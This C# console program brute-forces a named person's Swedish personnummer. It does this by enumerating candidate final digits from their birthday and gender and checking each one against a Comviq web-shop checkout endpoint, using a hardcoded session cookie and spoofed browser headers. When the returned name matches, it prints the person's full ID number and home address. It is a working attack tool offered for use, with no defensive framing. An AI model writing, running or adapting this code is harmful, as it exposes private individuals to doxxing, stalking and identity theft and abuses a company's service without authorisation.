using System;
using System.Activities;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Web.Script.Serialization;

namespace PN_Comviq
{
    class Program
    {
        private static string _birthday;
        private static string _firstName;
        private static string _lastName;

        public static string CheckSSN(string ssn)
        {
            //API URI
            string URI = "https://webbutik.comviq.se/checkout/customer/checkSsn/";

            //make request payload
            string requestBody = "ssn=" + ssn;

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(URI);  //make request         

            // set request headers
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";
            request.Referer = "https://webbutik.comviq.se/checkout/comviqcart/processing/?utm_expid=.Fa6s-00FTIS_gAg5MxoMqg.0&utm_referrer=https%3A%2F%2Fwebbutik.comviq.se%2Fsamsung-galaxy-a10.html";
            request.Host = "webbutik.comviq.se";
            request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246";
            request.Headers.Add("Cookie", "frontend=a972a1188c10f056e65cae46d387e234;");
            request.Headers.Add("X-Requested-With", "XMLHttpRequest");
            request.Headers.Add("Accept-Language", "en-GB,en;q=0.9,ar-SY;q=0.8,ar;q=0.7,sv-SE;q=0.6,sv;q=0.5,en-US;q=0.4");

            //Automatic decompression for compressed response
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (StreamWriter writer = new StreamWriter(request.GetRequestStream()))
            {
                writer.Write(requestBody); //write request payload
            }

            //get the response
            WebResponse response = request.GetResponse();

            string responseData;

            using (var reader = new StreamReader(response.GetResponseStream()))
            {
                responseData = reader.ReadToEnd();
            }
            response.Close();

            //decode the response since its base64 encoded and return it
            return Encoding.UTF8.GetString(Convert.FromBase64String(responseData));
        }

        //Generates last digit of SSN using Luhn algorithm
        public static string GenerateControlDigit(string baseNumber)
        {
            if (!double.TryParse(baseNumber, out double baseNumberInt)) throw new InvalidWorkflowException($"Field contains non-numeric character(s) : {baseNumber}");

            var step2 = string.Empty;
            for (var index = baseNumber.Length - 1; index >= 0; index -= 2)
            {
                var doubleTheValue = (int.Parse(baseNumber[index].ToString())) * 2;

                if (doubleTheValue > 9)
                    doubleTheValue = Math.Abs(doubleTheValue).ToString().Sum(c => Convert.ToInt32(c.ToString()));

                step2 = step2.Insert(0, (index != 0 ? baseNumber[index - 1].ToString() : "") + doubleTheValue);
            }
            var step3 = Math.Abs(Convert.ToDouble(step2)).ToString(CultureInfo.InvariantCulture).Sum(c => Convert.ToDouble(c.ToString())).ToString(CultureInfo.InvariantCulture);

            var lastDigitStep3 = Convert.ToInt32(step3[step3.Length - 1].ToString());
            string checkDigit = "0";

            if (lastDigitStep3 != 0)
                checkDigit = (10 - lastDigitStep3).ToString();

            //return baseNumber + checkDigit;
            return checkDigit;
        }

        static void Main(string[] args)
        {

            //Get Birthday
            Console.Write("Enter Birthday (YYYYMMDD): ");
            _birthday = Console.ReadLine();

            //Get First Name
            Console.Write("Enter Firstname: ");
            _firstName = Console.ReadLine();

            //Get Last Name
            Console.Write("Enter Lastname: ");
            _lastName = Console.ReadLine();

            //Get gender to determine the pattern
            Console.WriteLine("What Gender? (1 For Men, 0 For Women)");
            int gender = int.Parse(Console.ReadLine());

            var serializer = new JavaScriptSerializer();
            
            try
            {
                Console.Write("Brute forcing SSN... ");

                //use progress bar
                using (var progress = new ProgressBar())
                {
                    //1st digit loop (random)
                    for (int i = 8; i <= 9; i++)
                    {
                        //2nd digit loop (random)
                        for (int j = 0; j <= 9; j++)
                        {
                            //progress indicator + 1%
                            progress.Report(progress.currentProgress + 0.01);

                            //3d digit = Gender + step by 2 for gender pattern (semi-random)
                            for (int k = 0; k <= 9; k += 2)
                            {
                                //control digit (calculated using Luhn algorithm)
                                string controlDigit = GenerateControlDigit(_birthday.Remove(0, 2) + i + j + (gender + k));

                                //final calculated ssn number YYYYMMDD-XXXX
                                string ssn = _birthday + i + j + (gender + k) + controlDigit; //YYYYMMDD-ij(gender+k)controlDigit

                                //send request to API and get response
                                string apiResponse = CheckSSN(ssn);

                                //Check response for valid person data
                                if (apiResponse.ToLower().Contains(_firstName.ToLower()) && apiResponse.ToLower().Contains(_lastName.ToLower()))
                                {
                                    //dispose the progressbar
                                    progress.Dispose();

                                    //print person info
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine($"\r\n");

                                    //Deserialize response form the api
                                    ResponseData rd = serializer.Deserialize<ResponseData>(apiResponse);

                                    //print out the data
                                    Console.WriteLine("============== FOUND ===============");
                                    Console.WriteLine("Personnummer: " + rd.ssnInfo.identificationNumber.Insert(8, "-"));
                                    Console.WriteLine("====================================");
                                    Console.WriteLine("First Name  : " + rd.ssnInfo.firstName);
                                    Console.WriteLine("Last Name   : " + rd.ssnInfo.lastName);
                                    Console.WriteLine("Birthday    : " + rd.ssnInfo.birthday);
                                    Console.WriteLine("====================================");
                                    Console.WriteLine("City        : " + rd.ssnInfo.address.city);
                                    Console.WriteLine("Address     : " + rd.ssnInfo.address.streetAddress);
                                    Console.WriteLine("Postal Code : " + rd.ssnInfo.address.postalCode);

                                    //use goto to break from nested loop when match found
                                    goto done;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }

            done:
            Console.ReadKey();
        }
    }
}
